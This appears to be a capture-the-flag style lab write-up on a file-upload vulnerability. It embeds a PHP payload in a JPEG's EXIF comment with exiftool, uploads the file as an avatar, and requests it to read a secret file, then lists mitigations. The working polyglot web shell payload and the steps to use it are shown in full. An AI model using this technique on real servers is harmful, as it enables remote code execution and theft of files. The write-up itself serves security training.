# Lab 05 — Remote code execution via polyglot web shell upload

> **Expert** · [Official lab](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

**Entry point:** every bypass fails — the server verifies the file **is a
real image**. Hide the PHP inside a genuine JPEG (polyglot).

## Solution

1. Embed the payload in the image's EXIF Comment and save as `.php`:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" input.jpg -o polyglot.php
```

2. Upload `polyglot.php` as your avatar (it passes image checks).
3. `GET /files/avatars/polyglot.php` — the image bytes render, and inside
   them: `START <secret> END` — submit the secret — lab solved.

## Mitigation

Re-encode uploaded images (strip metadata), serve from a non-executing
directory with a random name, and set `Content-Type` explicitly.
